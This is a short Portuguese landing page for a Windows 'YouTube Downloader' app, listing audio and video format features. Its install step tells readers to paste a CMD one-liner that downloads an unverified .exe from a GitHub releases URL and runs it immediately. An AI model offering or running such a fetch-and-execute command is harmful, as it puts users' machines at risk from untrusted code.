⚡ YouTube Downloader

Aplicativo desktop moderno e rápido para baixar vídeos e áudios do YouTube no Windows.

🚀 Instalação Rápida via CMD / PowerShell

Abra o Prompt de Comando (CMD) e cole o comando abaixo para instalar em segundos:

curl -L "https://github.com/JulyMount/Youtube-Downloader/releases/latest/download/YouTube-Downloader-Setup.exe" -o "%TEMP%\yt-setup.exe" && "%TEMP%\yt-setup.exe"
💾 Baixar Instalador (.exe)

🎵 MP3 320kbps

Conversão direta para áudio de alta qualidade.

🎬 Premiere / After Effects

Codecs H.264 + AAC nativamente compatíveis com editores de vídeo.

⚙️ Opções Avançadas

Escolha qualidades específicas como 1080p, 720p ou 480p.
